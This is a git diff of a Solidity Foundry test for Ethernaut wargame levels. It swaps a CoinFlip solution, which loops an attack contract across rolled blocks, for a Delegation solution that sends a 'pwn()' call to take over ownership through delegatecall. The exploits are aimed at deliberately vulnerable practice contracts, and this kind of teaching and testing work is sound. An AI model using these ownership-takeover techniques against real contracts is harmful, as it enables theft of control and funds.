@@ -4,15 +4,14 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import {Utils} from "test/utils/Utils.sol";
 
-import {CoinFlip} from "src/levels/CoinFlip.sol";
-import {CoinFlipFactory} from "src/levels/CoinFlipFactory.sol";
-import {CoinFlipAttack} from "src/attacks/CoinFlipAttack.sol";
+import {Delegation} from "src/levels/Delegation.sol";
+import {DelegationFactory} from "src/levels/DelegationFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
 
-contract TestCoinflip is Test, Utils {
+contract TestDelegation is Test, Utils {
     Ethernaut ethernaut;
-    CoinFlip instance;
+    Delegation instance;
 
     address payable owner;
     address payable player;
@@ -32,12 +31,12 @@ contract TestCoinflip is Test, Utils {
 
         vm.startPrank(owner);
         ethernaut = getEthernautWithStatsProxy(owner);
-        CoinFlipFactory factory = new CoinFlipFactory();
+        DelegationFactory factory = new DelegationFactory();
         ethernaut.registerLevel(Level(address(factory)));
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = CoinFlip(createLevelInstance(ethernaut, Level(address(factory))));
+        instance = Delegation(createLevelInstance(ethernaut, Level(address(factory))));
         vm.stopPrank();
     }
 
@@ -54,13 +53,9 @@ contract TestCoinflip is Test, Utils {
     /// @notice Test the solution for the level.
     function testSolve() public {
         vm.startPrank(player);
-        CoinFlipAttack attacker = new CoinFlipAttack();
 
-        // To weaponize this attack you'd need to pole for a new block to be mined, as the contract only allows one flip per block.
-        for (uint256 i = 0; i < 10; i++) {
-            vm.roll(block.number + 1);
-            attacker.attack(address(instance));
-        }
+        (bool success, ) = address(instance).call(abi.encodeWithSignature("pwn()"));
+        require(success, "call not successful");
 
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
